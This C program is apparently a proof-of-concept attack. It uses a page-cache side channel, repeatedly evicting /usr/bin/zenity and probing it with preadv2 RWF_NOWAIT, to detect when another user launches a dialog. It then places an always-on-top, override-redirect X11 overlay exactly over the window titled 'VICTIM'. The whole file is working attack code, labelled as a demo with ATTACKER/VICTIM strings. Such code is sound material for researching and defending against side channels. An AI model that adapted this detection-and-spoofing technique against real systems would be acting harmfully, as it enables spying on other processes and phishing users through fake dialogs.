#define _GNU_SOURCE

#include <X11/Xatom.h>
#include <X11/Xlib.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/uio.h>
#include <time.h>
#include <unistd.h>

static ssize_t probe(int fd)
{
	char byte;
	struct iovec iov = {&byte, 1};
	return preadv2(fd, &iov, 1, 0, RWF_NOWAIT);
}

static int flush(int fd)
{
	int error = posix_fadvise(fd, 0, 4096, POSIX_FADV_DONTNEED);
	if (error)
		errno = error;
	return error;
}

static int title_matches(Display *display, Window window)
{
	Atom name = XInternAtom(display, "_NET_WM_NAME", False);
	Atom type;
	int format;
	unsigned long items, remaining;
	unsigned char *value = NULL;
	int matches = 0;

	if (XGetWindowProperty(display, window, name, 0, 256, False, AnyPropertyType,
			       &type, &format, &items, &remaining, &value) == Success &&
	    value) {
		matches = strstr((char *)value, "VICTIM") != NULL;
		XFree(value);
	}
	if (!matches) {
		char *legacy = NULL;
		if (XFetchName(display, window, &legacy) && legacy) {
			matches = strstr(legacy, "VICTIM") != NULL;
			XFree(legacy);
		}
	}
	return matches;
}

static Window find_victim(Display *display, Window window)
{
	Window root, parent, *children = NULL;
	unsigned int count = 0;

	if (title_matches(display, window))
		return window;
	if (!XQueryTree(display, window, &root, &parent, &children, &count))
		return None;
	for (unsigned int i = count; i > 0; --i) {
		Window found = find_victim(display, children[i - 1]);
		if (found != None) {
			XFree(children);
			return found;
		}
	}
	if (children)
		XFree(children);
	return None;
}

static unsigned long color(Display *display, int screen, const char *name,
			   unsigned long fallback)
{
	XColor value, exact;
	if (XAllocNamedColor(display, DefaultColormap(display, screen), name,
			     &value, &exact))
		return value.pixel;
	return fallback;
}

static void draw_overlay(Display *display, Window window, GC gc,
			 unsigned int width, unsigned int height,
			 unsigned long background, unsigned long header,
			 unsigned long foreground, unsigned long accent,
			 XFontStruct *title_font, XFontStruct *body_font)
{
	const char *title = "ATTACKER OVERLAY";
	const char *line1 = "Flush+Monitor detected the victim dialog.";
	const char *line2 = "This window is controlled by the attacker.";
	const char *button = "Continue";
	unsigned int button_width = 110, button_height = 34;
	int button_x = (int)width - (int)button_width - 24;
	int button_y = (int)height - (int)button_height - 18;

	XSetForeground(display, gc, background);
	XFillRectangle(display, window, gc, 0, 0, width, height);
	XSetForeground(display, gc, header);
	XFillRectangle(display, window, gc, 0, 0, width, 48);
	if (title_font)
		XSetFont(display, gc, title_font->fid);
	XSetForeground(display, gc, WhitePixel(display, DefaultScreen(display)));
	XDrawString(display, window, gc, 22, 31, title, (int)strlen(title));
	if (body_font)
		XSetFont(display, gc, body_font->fid);
	XSetForeground(display, gc, foreground);
	XDrawString(display, window, gc, 28, 83, line1, (int)strlen(line1));
	XDrawString(display, window, gc, 28, 108, line2, (int)strlen(line2));
	XSetForeground(display, gc, accent);
	XFillRectangle(display, window, gc, button_x, button_y,
		       button_width, button_height);
	XSetForeground(display, gc, WhitePixel(display, DefaultScreen(display)));
	XDrawString(display, window, gc, button_x + 20, button_y + 23,
		    button, (int)strlen(button));
}

static int show_overlay(void)
{
	Display *display = XOpenDisplay(NULL);
	if (!display) {
		fputs("ATTACKER: cannot open the X11 display\n", stderr);
		return 1;
	}

	int screen = DefaultScreen(display);
	Window root = RootWindow(display, screen);
	Window victim = None;
	struct timespec tick = {0, 10000000};
	for (int attempt = 0; attempt < 100 && victim == None; ++attempt) {
		victim = find_victim(display, root);
		if (victim == None)
			nanosleep(&tick, NULL);
	}

	unsigned int width = 430, height = 180;
	int x = (DisplayWidth(display, screen) - (int)width) / 2;
	int y = (DisplayHeight(display, screen) - (int)height) / 2;
	if (victim != None) {
		XWindowAttributes attributes;
		Window child;
		if (XGetWindowAttributes(display, victim, &attributes) &&
		    XTranslateCoordinates(display, victim, root, 0, 0,
				  &x, &y, &child)) {
			width = (unsigned int)attributes.width;
			height = (unsigned int)attributes.height;
		}
	}

	unsigned long background = color(display, screen, "#FFF7ED",
					 WhitePixel(display, screen));
	unsigned long header = color(display, screen, "#7F1D1D",
				     BlackPixel(display, screen));
	unsigned long foreground = color(display, screen, "#1F2937",
					 BlackPixel(display, screen));
	unsigned long accent = color(display, screen, "#B42318", header);
	XSetWindowAttributes attributes = {
		.override_redirect = True,
		.background_pixel = background,
		.border_pixel = header,
		.event_mask = ExposureMask,
	};
	Window overlay = XCreateWindow(display, root, x, y, width, height, 3,
				       CopyFromParent, InputOutput, CopyFromParent,
				       CWOverrideRedirect | CWBackPixel |
				       CWBorderPixel | CWEventMask, &attributes);
	XStoreName(display, overlay, "ATTACKER OVERLAY");
	Atom state = XInternAtom(display, "_NET_WM_STATE", False);
	Atom above = XInternAtom(display, "_NET_WM_STATE_ABOVE", False);
	XChangeProperty(display, overlay, state, XA_ATOM, 32, PropModeReplace,
			(unsigned char *)&above, 1);

	GC gc = XCreateGC(display, overlay, 0, NULL);
	XFontStruct *title_font = XLoadQueryFont(display, "9x15bold");
	XFontStruct *body_font = XLoadQueryFont(display, "9x15");
	XMapRaised(display, overlay);
	draw_overlay(display, overlay, gc, width, height, background, header,
		     foreground, accent, title_font, body_font);
	XFlush(display);

	for (int step = 0; step < 300; ++step) {
		while (XPending(display)) {
			XEvent event;
			XNextEvent(display, &event);
			if (event.type == Expose)
				draw_overlay(display, overlay, gc, width, height,
					     background, header, foreground, accent,
					     title_font, body_font);
		}
		XRaiseWindow(display, overlay);
		XFlush(display);
		nanosleep(&tick, NULL);
	}

	if (title_font)
		XFreeFont(display, title_font);
	if (body_font)
		XFreeFont(display, body_font);
	XFreeGC(display, gc);
	XDestroyWindow(display, overlay);
	XCloseDisplay(display);
	return 0;
}

int main(void)
{
	int fd = open("/usr/bin/zenity", O_RDONLY);
	struct timespec window = {0, 1000000};
	unsigned long rounds = 0;
	if (fd == -1) {
		perror("open /usr/bin/zenity");
		return 1;
	}

	puts("ATTACKER: monitoring /usr/bin/zenity (1 ms window)");
	puts("ATTACKER: start /tmp/ui-victim in another terminal");
	for (;;) {
		if (flush(fd)) {
			perror("flush");
			return 1;
		}
		nanosleep(&window, NULL);
		errno = 0;
		ssize_t result = probe(fd);
		++rounds;
		if (result == 1)
			break;
		if (result != -1 || errno != EAGAIN) {
			perror("preadv2");
			return 1;
		}
		do {
			result = probe(fd);
		} while (result == -1 && errno == EAGAIN);
		if (result != 1 || flush(fd)) {
			perror("restore");
			return 1;
		}
	}

	flush(fd);
	printf("ATTACKER: victim UI detected after %lu rounds\n", rounds);
	int error = show_overlay();
	close(fd);
	return error;
}
